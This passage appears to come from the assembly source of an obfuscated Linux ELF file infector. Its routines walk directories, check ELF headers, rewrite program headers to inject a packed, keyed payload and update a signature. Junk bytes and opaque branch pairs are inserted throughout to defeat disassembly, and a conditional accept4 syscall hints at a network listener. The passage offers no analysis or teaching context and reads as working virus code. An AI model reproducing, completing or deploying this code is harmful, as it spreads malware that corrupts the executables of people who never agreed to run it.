    js          ..@SmA33rkVl8GG
    jns         ..@SmA33rkVl8GG
..@rBwV7nBtLMP4:
    call        NonBinaryFile
    jmp         $+3
db 0x87
    je          ..@lAi8oTVbSfnV
    jne         ..@lAi8oTVbSfnV
..@HfmCOnY3wgMs:
    xor         r1, r1
    xor         r2, r2
    xor         r3, r3
    jmp         $+4
db 0x78, 0x64
    jl          ..@0wa7iqabKbXd
    jge         ..@0wa7iqabKbXd
..@CL1Bijx4jPDI:
    jz          ..@0KILeizp100j
    je          ..@wsyYhut8vt1z
    jne         ..@wsyYhut8vt1z
..@NWmwdLkIxukr:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, r1
    jl          ..@VMYQAhmQ1NBv
    jge         ..@VMYQAhmQ1NBv
..@OUigEOCdc93v:
    mov         rax, 1
    jmp         $+5
db 0x58, 0x2e, 0x72
    jmp         $+3
db 0xc8
    jmp         $+3
db 0x76
    jb          ..@sUnkOTFkyvOA
    jae         ..@sUnkOTFkyvOA
..@mH4B4vKb6rmn:
    rep         cmpsb
    js          ..@IGFjYo3tye1k
    jns         ..@IGFjYo3tye1k
..@gHpoQAcibciD:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    jl          ..@knOu1GohVdTt
    jge         ..@knOu1GohVdTt
..@Xkt0GjblZ86l:
    cmp         BYTE [r2], 0x0
    jz          ..@uzvn5kwGomio
    jmp         $+3
db 0xde
    jmp         $+3
db 0xf8
    js          ..@x1swpZrxv6p9
    jns         ..@x1swpZrxv6p9
..@rRDGiFz0NuXG:
    jmp         ..@7KHSEpiFze86
    js          ..@2Avt8e2aBmMY
    jns         ..@2Avt8e2aBmMY
..@NHTkFjfYjTFx:
    cmp         BYTE [r1+4], ELFCLASS
    jne         ..@vyXP1MaJbrGK
    jb          ..@GTxhRHjpEd4w
    jae         ..@GTxhRHjpEd4w
..@U6YxACR1Ik8W:
    pop         rbp
    jmp         $+4
db 0xc9, 0xc5
    jl          ..@vM2A1A6aGsdU
    jge         ..@vM2A1A6aGsdU
..@7ys4satLwRj4:
    mov         rcx, signature_len
    jmp         $+5
db 0xc9, 0xfb, 0x97
    jl          ..@6VV7qe0Gl57h
    jge         ..@6VV7qe0Gl57h
..@ksx4VjbVoZCI:
    xor         rax, rax
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, QWORD [r5+file.filesize]
    jmp         $+5
db 0x31, 0xa5, 0xaf
    jmp         $+3
db 0x96
    jmp         ..@0dfWk9XS3t0e
..@rCeHF41hRG3i:
    push        rax
    jmp         $+5
db 0x73, 0x4a, 0x46
    jmp         $+4
db 0xba, 0x0f
    je          ..@K8xXv8fftyl8
    jne         ..@K8xXv8fftyl8
..@Snx0Px8i0Qu5:
    mov         BYTE [r1], 0x00
    je          ..@LnQ0NFIfboes
    jne         ..@LnQ0NFIfboes
..@m7rwl0eyeD48:
    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
    lea         r1, [rsp+_INFFILE_OFF.file]
    mov         r2, 1b
    jmp         $+3
db 0x16
    jmp         ..@n89nT4TbLvmF
..@ZcsA37GyBpZW:
    sub         r4, m6
    mov         QWORD [r2+p_h.p_vaddr], r3
    mov         QWORD [r2+p_h.p_paddr], r3
    je          ..@puq1Qm76DsSI
    jne         ..@puq1Qm76DsSI
..@18WcfIg6mNzQ:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_ACCEPT4
%endif
    jmp         $+3
db 0xf8
    jb          ..@zoekxl7gmNdp
    jae         ..@zoekxl7gmNdp
..@6v9kkk8rBFKy:
%ifndef ENABLE_DEBUGGING
    cmp         r2b, 0x0
%endif
    jmp         $+5
db 0x39, 0xd3, 0xfb
    jmp         $+4
db 0xc5, 0xb4
    jmp         $+4
db 0x5e, 0x85
    jl          ..@iqQ9VFzHu8ux
    jge         ..@iqQ9VFzHu8ux
..@qksdmEeAm7BI:
    call        MemMove
    jmp         $+5
db 0xd1, 0x97, 0xfb
    jb          ..@Rk2NAudoGH1S
    jae         ..@Rk2NAudoGH1S
..@ymYQ71NNhVxQ:
    xor         rcx, rcx
    jmp         ..@RCqmn8AMJ6lZ
..@ZlzoWbGZ1rCK:
    xor         rax, rax
    jmp         $+4
db 0x69, 0xce
    jmp         $+3
db 0x97
    js          ..@B0BADypkjmYD
    jns         ..@B0BADypkjmYD
..@JTxDhW9db7bn:
    mov         r1, [rsp+_NBF_OFF.file]
    jb          ..@fbAUubcjxq8O
    jae         ..@fbAUubcjxq8O
..@0KILeizp100j:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    xor         r1, r1
    jmp         $+3
db 0xf5
    jmp         ..@ahfTYeSYykua
..@jqQESu5CygXg:
    cmp         BYTE [r5], DT_DIR
    jb          ..@gLuOpw7YkXlC
    jae         ..@gLuOpw7YkXlC
..@vyXP1MaJbrGK:
    mov         r1, QWORD [r5+file.filename]
    js          ..@HNquriElelAf
    jns         ..@HNquriElelAf
..@Y80XuG71Ex34:
    rep         stosb
    jmp         $+3
db 0xf7
    jb          ..@XwNRN6VUayZQ
    jae         ..@XwNRN6VUayZQ
..@vav5txFodfoe:
    mov         BYTE [rdi], al
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jmp         $+5
db 0xd6, 0x34, 0x96
    jl          ..@OyLkhrvjqayG
    jge         ..@OyLkhrvjqayG
..@6oEJ0ti81Y2t:
    xor         rdi, rdi
    xor         rcx, rcx
    js          ..@JXdXZohRUk08
    jns         ..@JXdXZohRUk08
..@BJKiSf1AEWCp:
    ret
    jmp         $+3
db 0xcf
    jmp         $+4
db 0x86, 0xe1
    js          MapFile
    jns         MapFile
..@eg5JyyEeGkV3:
    cmp         rax, 0x00
    jl          ..@QtPPrQ7ZMsxf
    xor         r4, r4
    jl          ..@ruHQhX3gBaSr
    jge         ..@ruHQhX3gBaSr
..@8wufH4GiCeH3:
    ret
    jmp         $+4
db 0xc6, 0x66
    jmp         GetNewProgramVaddr
..@g0eNFfY8wSCG:
    jz          ..@UmSSUK2tBSI3
    js          ..@pAu2GKIycbwo
    jns         ..@pAu2GKIycbwo
..@GRP8WCm0NhRk:
    movdqu      xmm1, oWORD [rsp+0xb0]
    jmp         $+3
db 0xdc
    jmp         $+5
db 0x95, 0xf2, 0x4a
    jmp         ..@SMelzEIg0xg7
..@QXEa7GGbJfoZ:
    ret
    jmp         $+3
db 0x58
    je          UnmapFile
    jne         UnmapFile
..@K8xXv8fftyl8:
    VAR         packed, dirs_root
    js          ..@rRDGiFz0NuXG
    jns         ..@rRDGiFz0NuXG
..@N3nkgLLSdJoB:
%ifndef ENABLE_DEBUGGING
    jmp         ..@BIi4Qc1lzBTK
%endif
    jmp         $+5
db 0x70, 0xee, 0x08
    jmp         ..@FLOpcNILXmqb
..@NRzMR22zjb6z:
    call        MemMove
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    jmp         ..@5r4FzHpNYEcf
..@7Ai5AiqIqJSU:
    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
    mov         r2, r1
    add         r2, e_h.e_shoff
    jmp         $+3
db 0xe2
    js          ..@5roa49G0RwiD
    jns         ..@5roa49G0RwiD
..@G33XnevC63bf:
%ifdef X86_32
    xor         eax, eax
%endif
    jl          ..@Jg0SraqkQ0Mw
    jge         ..@Jg0SraqkQ0Mw
..@FN2ZwXBHfNCm:
    mov         eax, SYS_READ
    syscall
    CFILE       DWORD [rsp+_KEYGEN_OFF.fd]
    jb          ..@ohAuwiN1mqxV
    jae         ..@ohAuwiN1mqxV
..@ejk1sQuiIJ9R:
    add         r5, QWORD [r4+rax+p_h.p_memsz]
    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jmp         $+4
db 0x48, 0xed
    jmp         $+3
db 0x38
    jmp         ..@bEiiNlD9uxbv
..@CI1StFaaRwgg:
    jl          ..@nrAsoxSX0FYK
    jmp         $+3
db 0x8f
    jl          ..@kz0VBIOMqOpM
    jge         ..@kz0VBIOMqOpM
..@WrRZTFNoy02l:
    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
    add         r1, e_h.e_shentsize
    mov         ax, WORD [r1]
    jmp         $+3
db 0x8c
    jmp         $+3
db 0x93
    jmp         ..@9AVCfmRKUCLg
..@RzInpbhJLAlo:
    add         r4, rax
    jmp         $+3
db 0xde
    jmp         ..@SlheDzf3NDBd
..@NwLvwrtQ98S1:
    ret
    jmp         $+3
db 0xba
    jb          NonBinaryFile
    jae         NonBinaryFile
..@AmckUwhgQCux:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    js          ..@cAPtdXvuH5By
    jns         ..@cAPtdXvuH5By
..@1PgHTRYNl33i:
    mov         al, BYTE [rdi]
    mov         BYTE [rsp+_LZSSE_OFF.character], al
    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         ..@zWmXX9KO2gbZ
..@cd1J4EEKhCz8:
    cmp         BYTE [r1+16], ET_DYN
    jmp         $+4
db 0x55, 0xb3
    jmp         $+3
db 0x20
    je          ..@RiwfKybu7dsz
    jne         ..@RiwfKybu7dsz
..@zI00mwrshSLR:
%ifdef X86_64
    xor         rax, rax
    xor         rdi, rdi
    xor         rdx, rdx
%endif
    jb          ..@NjDtL4vj3iyA
    jae         ..@NjDtL4vj3iyA
..@dCvKl2HqrL6r:
    add         r1, _signature-_start
    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
    jmp         $+4
db 0x8e, 0x66
    jb          ..@cvC87pmZSOfx
    jae         ..@cvC87pmZSOfx
..@gzgmrooWVWfy:
    jz          ..@X9ljtYImVWpb
    jl          ..@cX4JfmBgWqmk
    jge         ..@cX4JfmBgWqmk
..@qpYTNr9TdNkd:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
    mov         eax, 0x20
    rep         stosb
    jmp         $+5
db 0x07, 0x03, 0xfb
    jmp         $+4
db 0xf2, 0xba
    jmp         ..@ESjF0l6JHjrq
..@WU3fv8zWT0w7:
    mov         r2, QWORD [r1+e_h.e_entry]
    test        r2, r2
    jz          ..@WJF4uIIQSfK0
    jmp         ..@3BHLba09CYYz
..@MrzkkWb1DKG3:
    add         r3, r5
    jmp         $+4
db 0x19, 0x55
    jl          ..@25wd5MsTCPuu
    jge         ..@25wd5MsTCPuu
..@0dfWk9XS3t0e:
    mov         rax, SYS_MUNMAP
    syscall
    xor         r1, r1
    jmp         $+4
db 0x88, 0x75
    jmp         $+3
db 0xbc
    jb          ..@YGgnlH7V92Xe
    jae         ..@YGgnlH7V92Xe
..@r6pohx8AQQyY:
    mov         r1, r5
    jmp         $+4
db 0x21, 0xa4
    jmp         ..@YryzbIH1oL56
InfectionRoutine:
    jmp         ..@1uIRkZ2Im4xd
..@NjuLH2WB9JMZ:
    and         r3, 0xfff 
    js          ..@3d5u7aabYk1k
    jns         ..@3d5u7aabYk1k
..@DG4XsFvvrcgd:
    jne         ..@E30ij6Jqzn3b
    jl          ..@kfrBqYF0HIi8
    jge         ..@kfrBqYF0HIi8
..@HLw3PreJRC24:
    VAR         packed, pwd_var
    jmp         $+5
db 0x59, 0xbf, 0x31
    jmp         $+5
db 0x55, 0x96, 0x4b
    jmp         $+4
db 0xbe, 0x66
    jmp         ..@zEgvuzbBLXDi
..@N8Cv9TVO6HYU:
    jl          ..@ohAuwiN1mqxV
    mov         DWORD [rsp+_KEYGEN_OFF.fd], eax
    jmp         $+4
db 0x67, 0x8b
    jl          ..@44VykqrikRnR
    jge         ..@44VykqrikRnR
..@vrpT4ZHnQJXE:
    jnz         ..@V0ftHA7ce6cV
    jb          ..@MW10r1vY8mE4
    jae         ..@MW10r1vY8mE4
..@HiAcjwHSMbKO:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
    jl          ..@aByPF9fFEbgV
    jge         ..@aByPF9fFEbgV
..@uEO04jqRgfzu:
    push        r3
    mov         r1, r4
    mov         r2, m5
    jmp         $+3
db 0x8a
    jmp         $+4
db 0xbb, 0x45
    jmp         ..@la9x52Cwnu0x
UpdateSignature:
    jmp         ..@DhxjLD2gaVNB
..@jY6O4FNOp9yp:
    jmp         ..@viQz0lCjMiYA
    js          ..@GTf59OKL9Dpc
    jns         ..@GTf59OKL9Dpc
..@Bhra8iXkVTNu:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    jmp         $+3
db 0xb0
    js          ..@lY7iQQlb6bAC
    jns         ..@lY7iQQlb6bAC
..@qv0p3DlcMdKx:
    xor         rcx, rcx
    xor         rbx, rbx
    xor         rdx, rdx
    jmp         $+4
db 0x18, 0x99
    jmp         ..@qL1jxGp71W1E
..@7uUFcX9pk3KI:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+4
db 0x8d, 0xb6
    jmp         $+3
db 0xc8
    jmp         ..@gx7sAO19hIAC
..@xuzWxD4br9uq:
    mov         r1, r5
    jmp         $+5
db 0x17, 0xad, 0x80
    jmp         $+5
db 0x02, 0x55, 0xe0
    je          ..@68BGib7fT49Q
    jne         ..@68BGib7fT49Q
..@lo13QlXN1YNn:
%ifdef X86_64
    mov         edx, r10d
    mov         r10d, 0x01
    mov         r8d, DWORD [r8+file.filefd]
%endif
    jmp         $+4
db 0x72, 0xd2
    jb          ..@SFe9fzb3gou1
    jae         ..@SFe9fzb3gou1
..@3d5u7aabYk1k:
    mov         rbx, 0x1000
    jmp         $+4
db 0x7d, 0x1d
    jmp         $+4
db 0x8a, 0xe0
    jmp         $+5
db 0xbe, 0x14, 0x96
    jmp         ..@2A9j6uQTdKms
..@nzAE5L64j0Q7:
    cmp         rax, 0
    jne         ..@nfozY7oOHVSv
    mov         r2, m5
    jmp         $+3
db 0x1c
    jl          ..@rBwV7nBtLMP4
    jge         ..@rBwV7nBtLMP4
..@8Y8rIJkuRXV3:
    add         rsi, rcx
    jb          ..@dGCzHKkjlUzY
    jae         ..@dGCzHKkjlUzY
..@viQz0lCjMiYA:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+3
db 0x7b
    js          ..@vav5txFodfoe
    jns         ..@vav5txFodfoe
..@lY7iQQlb6bAC:
    jl          ..@fr5lmv2eRJt9
    jmp         $+3
db 0x82
    jl          ..@Jhxm9IhNhPfv
    jge         ..@Jhxm9IhNhPfv
..@4KJW7e21bp4E:
    CFILE       [rsp+_INFDIR_OFF.dirfd]
    js          ..@YQJuimMl6fHB
    jns         ..@YQJuimMl6fHB
..@RK2S7dpTmzdB:
    mov         rax, (-1)
    jl          ..@st7z9tCaDC3K
    jge         ..@st7z9tCaDC3K
..@dRQooXakfUsK:
    ret
    js          ..@vyXP1MaJbrGK
    jns         ..@vyXP1MaJbrGK
..@la9x52Cwnu0x:
    call        CreatePayload
    pop         r3
    pop         r2
    jmp         $+3
db 0xa7
    jb          ..@Wu64YUsSiHQl
    jae         ..@Wu64YUsSiHQl
..@nfozY7oOHVSv:
    add         rsp, _INFFILE_OFF_size
    js          ..@3aalKWK5995i
    jns         ..@3aalKWK5995i
..@Sdqxxzh0gMmQ:
    mov         m6, rax
    mov         r1, rax
    jl          ..@cS6dkXeubave
    jge         ..@cS6dkXeubave
..@qq1XlTPw79Lq:
    cmp         rax, 0x00
    js          ..@KQz0eXDjx6J9
    jns         ..@KQz0eXDjx6J9
..@8AEzm0TXwD7k:
    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jmp         $+5
db 0x6c, 0x08, 0x44
    jmp         $+4
db 0x62, 0x7a
    jmp         ..@u8pBQkJYtVXf
..@7dVW2qbHndQo:
    mov         edx, LOOKAHEAD_LENGTH
    cmp         ax, LOOKAHEAD_LENGTH
    cmovl       dx, ax
    je          ..@8dXIGrYbOegR
    jne         ..@8dXIGrYbOegR
..@8oLSGPBTb0sc:
    cmp         rax, (-1)
    js          ..@Gbo8MEVQbtJl
    jns         ..@Gbo8MEVQbtJl
..@0bC0CAknVWoZ:
    jl          ..@DGTTzc0sw22x
    leave
    jl          ..@QnYDgrbvB0r7
    jge         ..@QnYDgrbvB0r7
..@EboC1gGLRgJo:
    ret
    jmp         $+3
db 0x83
    jmp         CreatePayload
..@OHnaW7YCywLT:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    je          ..@BIi4Qc1lzBTK
    jne         ..@BIi4Qc1lzBTK
..@5sFZgNPH4t8b:
    mov         QWORD [r2+p_h.p_offset], r3
    push        r2
    push        r3
    jmp         $+5
db 0xa6, 0x5e, 0x3d
    js          ..@7cHjQ4IMOvXr
    jns         ..@7cHjQ4IMOvXr

_eof:
